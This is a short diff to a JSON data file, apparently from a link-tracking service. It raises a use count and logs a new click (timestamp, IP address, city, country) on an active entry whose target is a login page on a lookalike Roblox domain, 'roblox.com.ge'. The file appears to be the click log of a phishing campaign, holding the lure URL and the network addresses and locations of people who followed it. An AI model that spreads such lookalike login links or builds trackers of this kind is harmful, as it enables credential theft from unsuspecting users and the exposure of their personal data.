@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1098,
+    "useCount": 1099,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8928,6 +8928,14 @@
         "city": "Ipoh",
         "flag": "🇲🇾",
         "countryCode": "MY"
+      },
+      {
+        "timestamp": 1777260824023,
+        "ip": "180.190.36.154",
+        "country": "Philippines",
+        "city": "San Juan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
